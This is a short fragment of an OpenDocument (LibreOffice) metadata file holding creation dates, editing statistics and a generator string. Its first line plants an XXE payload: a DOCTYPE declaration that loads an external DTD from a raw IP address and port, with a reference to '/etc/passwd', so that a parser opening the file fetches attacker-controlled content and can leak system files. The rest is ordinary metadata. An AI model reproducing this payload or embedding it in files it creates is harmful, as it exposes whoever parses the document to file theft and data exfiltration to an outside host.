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DOCTYPE roottag  PUBLIC '-//OXML/XXE/EN'  'http://146.185.129.224:8080/a.dtd//etc/passwd'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§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11:34:50.568914062</meta:creation-date>
    <dc:date>2016-07-31T11:36:05.209438839</dc:date>
    <meta:editing-duration>P0D</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="1" meta:cell-count="1" meta:object-count="0"/>
    <meta:generator>LibreOffice/4.2.7.2$Linux_X86_64 LibreOffice_project/420m0$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>